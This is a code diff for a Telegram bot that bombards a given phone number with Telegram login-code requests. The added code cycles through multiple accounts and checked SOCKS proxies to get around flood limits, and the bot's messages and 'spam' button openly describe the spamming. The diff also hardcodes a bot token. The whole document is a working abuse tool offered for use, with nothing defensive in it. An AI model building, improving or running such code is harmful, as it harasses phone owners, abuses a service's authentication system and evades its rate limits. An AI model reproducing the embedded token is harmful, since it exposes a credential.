@@ -7,6 +7,7 @@ from flask import Flask, request
 import telebot
 from telebot import types
 from telethon import TelegramClient, errors
+import socks
 
 TOKEN = "8645900110:AAGpHWaoA9sitUw7KR34NGTJNSKkFxDswgM"
 ACCOUNTS = [
@@ -21,25 +22,40 @@ ACCOUNTS = [
 
 bot = telebot.TeleBot(TOKEN, threaded=False)
 user_states = {}
-clients = []
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-def init_clients():
-    async def _init():
-        for acc in ACCOUNTS:
-            client = TelegramClient(None, acc["api_id"], acc["api_hash"])
-            await client.connect()
-            clients.append(client)
-    loop.run_until_complete(_init())
+def load_proxies():
+    try:
+        with open("proxy.txt", "r") as f:
+            lines = [line.strip() for line in f if line.strip()]
+        proxies = []
+        for line in lines:
+            if "://" in line:
+                parts = line.split("://")
+                if len(parts) == 2:
+                    proto, addr = parts
+                    if ":" in addr:
+                        ip, port = addr.split(":")
+                        proxies.append((proto, ip, int(port)))
+            else:
+                if ":" in line:
+                    ip, port = line.split(":")
+                    proxies.append(("socks5", ip, int(port)))
+        return proxies
+    except Exception as e:
+        print(f"Ошибка загрузки proxy.txt: {e}")
+        return []
 
-init_clients()
-
-def clean_phone(phone):
-    phone = re.sub(r'[^0-9+]', '', phone)
-    if not phone.startswith('+'):
-        phone = '+' + phone
-    return phone
+async def check_proxy(proxy):
+    proto, ip, port = proxy
+    client = TelegramClient(None, 12345, "fakehash", proxy=(socks.SOCKS5, ip, port) if proto == "socks5" else None)
+    try:
+        await client.connect()
+        await client.disconnect()
+        return True
+    except:
+        return False
 
 def safe_edit(chat_id, msg_id, text, reply_markup=None):
     try:
@@ -48,53 +64,68 @@ def safe_edit(chat_id, msg_id, text, reply_markup=None):
         if "message is not modified" not in str(e):
             print(f"Edit error: {e}")
 
+async def send_code_with_proxy(client_acc, phone, proxy):
+    api_id = client_acc["api_id"]
+    api_hash = client_acc["api_hash"]
+    proto, ip, port = proxy
+    client = TelegramClient(None, api_id, api_hash, proxy=(socks.SOCKS5, ip, port) if proto == "socks5" else None)
+    try:
+        await client.connect()
+        await client.send_code_request(phone)
+        await client.disconnect()
+        return True
+    except errors.FloodWaitError as e:
+        raise e
+    except Exception as e:
+        print(f"Ошибка с прокси {ip}:{port} - {e}")
+        return False
+
 def send_codes_sync(chat_id, msg_id, phone):
     async def send_codes():
-        log_msg = bot.send_message(chat_id, "otpravka nachata...")
+        log_msg = bot.send_message(chat_id, "proveriau proxy podochdi...")
+        proxies = load_proxies()
+        if not proxies:
+            safe_edit(chat_id, msg_id, "net proxy v fail proxy.txt")
+            return
+        safe_edit(chat_id, log_msg.message_id, "proveryau proxy...")
+        tasks = [check_proxy(p) for p in proxies]
+        results = await asyncio.gather(*tasks)
+        good_proxies = [p for p, ok in zip(proxies, results) if ok]
+        if not good_proxies:
+            safe_edit(chat_id, msg_id, "net rabochih proxy")
+            return
+        safe_edit(chat_id, log_msg.message_id, f"naydeno {len(good_proxies)} rabochih proxy")
+        safe_edit(chat_id, msg_id, "nachinaiu spamit...")
+
         max_flood = 0
         total_sent = 0
-        results = []
+        proxy_index = 0
 
-        async def send_one_client(client, idx):
-            nonlocal max_flood, total_sent
-            sent = 0
-            attempt = 0
-            while attempt < 6:
-                try:
-                    await client.send_code_request(phone)
-                    sent += 1
+        for acc in ACCOUNTS:
+            try:
+                proxy = good_proxies[proxy_index % len(good_proxies)]
+                proxy_index += 1
+                success = await send_code_with_proxy(acc, phone, proxy)
+                if success is True:
                     total_sent += 1
-                    attempt += 1
-                    await asyncio.sleep(2)
-                except errors.FloodWaitError as e:
-                    if e.seconds > max_flood:
-                        max_flood = e.seconds
-                    remaining = e.seconds
-                    while remaining > 0:
-                        safe_edit(chat_id, msg_id, f"floodwait - {remaining} sekund")
-                        await asyncio.sleep(1)
-                        remaining -= 1
-                    attempt += 1
-                except Exception as e:
-                    print(f"[ERROR] Akk{idx}: {e}")
-                    await asyncio.sleep(2)
-                    attempt += 1
-            return sent
+                elif isinstance(success, Exception):
+                    raise success
+            except errors.FloodWaitError as e:
+                if e.seconds > max_flood:
+                    max_flood = e.seconds
+                break
+            except Exception as e:
+                print(f"Ошибка аккаунта: {e}")
 
-        tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
-        results = await asyncio.gather(*tasks)
-        total_sent = sum(results)
         safe_edit(chat_id, log_msg.message_id, f"otpravleno {total_sent} codov")
-        safe_edit(chat_id, msg_id, "gotovo")
         if max_flood > 0:
-            remaining = max_flood
-            while remaining > 0:
-                safe_edit(chat_id, msg_id, f"floodwait - {remaining} sekund")
-                time.sleep(1)
-                remaining -= 1
+            safe_edit(chat_id, msg_id, f"floodwait - {max_flood} sekund")
+        else:
+            safe_edit(chat_id, msg_id, "gotovo")
+
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
-        safe_edit(chat_id, msg_id, "floodwait zakonchen, mozhesh dalshe spamit", reply_markup=kb)
+        safe_edit(chat_id, msg_id, "nashmi dalshe", reply_markup=kb)
         if chat_id in user_states:
             user_states[chat_id]["timer_task"] = None
 
@@ -125,7 +156,9 @@ def handle_phone(message):
     state = user_states.get(chat_id)
     if not state or not state.get("waiting_phone"):
         return
-    phone = clean_phone(message.text)
+    phone = re.sub(r'[^0-9+]', '', message.text)
+    if not phone.startswith('+'):
+        phone = '+' + phone
     state["waiting_phone"] = False
     bot.delete_message(chat_id, message.message_id)
     send_codes_sync(chat_id, state["message_id"], phone)
